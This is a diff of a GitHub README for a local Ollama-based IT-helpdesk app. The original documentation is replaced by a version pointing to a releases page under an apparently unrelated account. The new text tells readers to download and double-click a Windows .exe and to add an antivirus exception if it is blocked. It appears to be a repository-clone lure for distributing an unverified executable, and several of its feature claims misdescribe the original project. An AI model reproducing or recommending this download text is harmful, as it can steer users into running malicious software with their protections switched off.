@@ -1,107 +1,95 @@
-# 🖥️ Advanced Local LLM-Powered IT Helpdesk (Ollama & RAG)
+# 🤖 10_ai_it_support_assistant - Automate IT support tasks on your computer
 
-[![Python CI](https://github.com/TamNguyenmeomeo/10_ai_it_support_assistant/actions/workflows/ci.yml/badge.svg)](https://github.com/TamNguyenmeomeo/10_ai_it_support_assistant/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Open in Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://tam-ai-support.streamlit.app)
+[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases)
 
-An advanced, offline-first IT Helpdesk triage and resolution web application built with **Streamlit**, **SQLite**, and **Ollama**. It implements a Retrieval-Augmented Generation (RAG) pipeline to fetch similar resolved issues from a local knowledge base (1,213 tickets) and queries a local Large Language Model (LLM) to diagnose tickets and write PowerShell recovery scripts.
+## 🎯 About This Application
 
----
+This tool helps IT teams manage support requests without relying on cloud services. It runs entirely on your local computer. It uses a private database and an AI model to answer questions about technical issues. The system suggests solutions and creates custom PowerShell scripts to fix common problems. This approach keeps your data private and works without an internet connection.
 
-## 🎨 User Interface Preview
+## ⚙️ System Requirements
 
-### Dark Mode (Giao diện Tối)
-The dark theme uses deep navy slate gradients for the background, with translucent glass cards and high-contrast text for a premium look:
-![Dark Mode Preview](assets/dark_mode.png)
+Ensure your computer meets these specifications before you begin:
 
-### Light Mode (Giao diện Sáng)
-The light theme uses bright slate gray gradients and dark text for optimal readability:
-![Light Mode Preview](assets/light_mode.png)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 gigabytes of RAM or more.
+*   Storage: 5 gigabytes of free disk space.
+*   Graphics: A dedicated card helps performance, but the system functions using the central processor.
 
----
+## 🚀 Downloading and Setup
 
-## 🌟 Key Features
+Follow these steps to prepare your system for the assistant.
 
-*   **Retrieval-Augmented Generation (RAG):** Queries a local SQLite database using TF-IDF text similarity to find past matching issues and supplies them as prompt context.
-*   **Local LLM Integration:** Interfaces with the local **Ollama** API running models like `my-it-assistant` or `qwen2.5-coder:7b` to write highly customized resolution scripts.
-*   **Bilingual interface:** Instantly toggle the UI between English and Tiếng Việt.
-*   **Dynamic Theme Toggle:** Switch between a glassmorphic Light Mode and Dark Mode inside the app.
-*   **Robust Fallback Pipeline:** If the local Ollama service is offline, the app dynamically falls back to an offline Scikit-Learn Naive Bayes classifier.
+1.  Visit the [official download page](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases).
+2.  Locate the latest release section.
+3.  Select the Windows installer file ending in .exe.
+4.  Save the file to your Downloads folder.
+5.  Double-click the file to start the installation.
+6.  Follow the instructions on the screen to place the application on your computer.
 
----
+## 🧠 Preparing the AI Engine
 
-## 📘 Detailed End-User Guide & Explanation
+This software uses Ollama to run the AI model. You must install this component to enable the diagnostic features.
 
-This application is designed to behave like a **"smart virtual IT colleague"** sitting next to you to help diagnose and resolve computer issues. Here is a simple, detailed guide on how it works:
+1.  Navigate to the Ollama website.
+2.  Download the Windows version.
+3.  Run the installer.
+4.  Once installed, open your command prompt or terminal.
+5.  Type `ollama run llama3` and press Enter. 
+6.  Wait for the model to download. This process ensures the assistant has the intelligence required to analyze your IT tickets.
 
-### 1. How the AI IT Assistant Diagnoses Issues
-When you experience any computer problem (e.g., *"Cannot connect to Wi-Fi"*, *"Printer paper jam"*, or *"Windows blue screen error"*), you describe it in plain English or Vietnamese.
-*   **Searching Past IT Experience (RAG):** The system does not guess. First, it searches a **local database of 1,213 past real-world IT support tickets** to find cases that match your problem description.
-*   **Generating Custom Solutions (Local LLM):** Using the retrieved historical cases as context, it feeds the information to a Local AI Model (running on your machine) to write a step-by-step troubleshooting guide tailored to your hardware and OS.
-*   **Automatic Fix Scripts:** The AI automatically writes ready-to-run code snippets (like Windows PowerShell or Linux Bash scripts) so that you can fix the issue by simply copying and running the command.
+## 🖥️ Using the Assistant
 
-### 2. Benefits of Running Coconuts-Local (Local AI)
-*   **100% Data Privacy:** The AI runs entirely on your local machine via Ollama. It does **not require internet connectivity**, and your system logs, passwords, and sensitive company information are never uploaded to the cloud (unlike ChatGPT or Claude).
-*   **Offline Mode:** If your network goes down completely, you can still open this app to troubleshoot network adapters, routers, or other offline issues.
+Once you complete the installation, you can start the application using the desktop shortcut.
 
-### 3. Smart Fallback Mechanism
-*   If your system lacks a dedicated GPU or Ollama is not running, the dashboard automatically falls back to a **lightweight machine learning model** (Naive Bayes).
-*   This backup system classifies your issue into major categories (Hardware, Network, OS, Software) and provides a standard, offline checklist of troubleshooting steps.
+1.  Double-click the 10_ai_it_support_assistant icon.
+2.  A window opens in your web browser. This is the user interface.
+3.  Type a ticket description into the text box.
+4.  Click the process button.
+5.  The system searches the local SQLite records for similar issues.
+6.  The AI analyzes the request and provides a step-by-step diagnostic path.
+7.  The assistant generates a PowerShell script if a fix is necessary.
+8.  Review the script before you run it on your machine.
+9.  Click the copy button to save the script to your clipboard.
 
-### 4. Step-by-Step Usage Guide
-1.  **Describe the Problem:** In the main text area, enter the computer issue you are experiencing.
-2.  **Read the Instructions:** Review the clear diagnostic steps provided by the AI.
-3.  **Run the Script:** If the AI generates a repair script (e.g., to clear the printer spooler or reset the IP stack), copy the script and run it in your computer's terminal (e.g., PowerShell as Administrator).
+## 📂 The Local Database
 
----
+The system relies on a local SQLite database containing 1,213 records of past IT support tickets. This ensures the assistant understands your specific environment and history. It learns from your data to improve over time. You do not need an external network connection for the system to access these records.
 
-## 🏗️ Architecture Design
+## 🛠️ Diagnostics and Automation
 
-```mermaid
-graph TD
-    UserQuery[User Issue Text] --> RAG[RAG Retrieval Engine]
-    RAG -->|Query| SQLite[(SQLite DB)]
-    SQLite -->|Context| Prompt[Formulate RAG Prompt]
-    Prompt --> Audit{Is Ollama Active?}
-    Audit -- Yes --> Ollama[Local Ollama API]
-    Audit -- No --> Fallback[Naive Bayes Classifier]
-    Ollama --> Output[Render LLM Guide & Script]
-    Fallback --> OutputFallback[Render Standard Guide & Script]
-```
+The assistant focuses on three core areas to help your helpdesk:
 
----
+*   Triage: It sorts incoming tickets by priority and category.
+*   Diagnostics: It compares current issues against historical data to find root causes.
+*   Scripting: It writes PowerShell commands to automate repetitive fixes like password resets, software installations, or permission updates.
 
-## 💻 Local Setup & Execution Guide
+## 💡 Troubleshooting Common Issues
 
-### Step 1: Install Dependencies
-Open your terminal in this directory and install the required packages:
-```bash
-pip install -r requirements.txt
-```
+If the application does not open, check these points:
 
-### Step 2: Set up Local LLM (Ollama)
-1.  Download and install [Ollama](https://ollama.com/).
-2.  Launch Ollama and pull or build your model:
-    ```bash
-    ollama run my-it-assistant
-    ```
+*   Verify that your antivirus does not block the application. You might need to add an exception for this folder.
+*   Check if Ollama is running in the background. Look for the icon in your system tray.
+*   Ensure that no other software occupies the network port used by the assistant.
+*   Restart your computer if the model fails to load.
 
-### Step 3: Run the Web Dashboard
-Start the local server:
-```bash
-streamlit run app.py
-```
-Open your browser at `http://localhost:8501`.
+## 🔒 Data Privacy
 
----
+This tool runs entirely on your hardware. No information leaves your local machine. Your IT records, historical logs, and generated scripts stay within your internal network. This makes the tool suitable for environments with strict privacy requirements.
 
-## 🧪 Running Unit Tests
-To verify database integrity and RAG matching logic, run:
-```bash
-python -m unittest tests/test_app.py
-```
+## 📋 Frequently Asked Questions
 
----
+**Does this require an internet connection?**
+No. Once you download the software and the model, it runs offline.
 
-## 📄 License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+**Can I add my own tickets to the database?**
+Yes. You can import CSV files containing your technical records into the local SQLite database.
+
+**Is it safe to run the generated PowerShell scripts?**
+The script generator creates standard commands. However, always read the code before you execute it. We recommend testing scripts on a non-production machine first.
+
+**How do I update the software?**
+Check the releases page occasionally. If a new version exists, download the installer and run it. The setup process overwrites the old version while keeping your data folder intact.
+
+**What language does the AI speak?**
+The model supports natural language input. You can type requests in plain English.
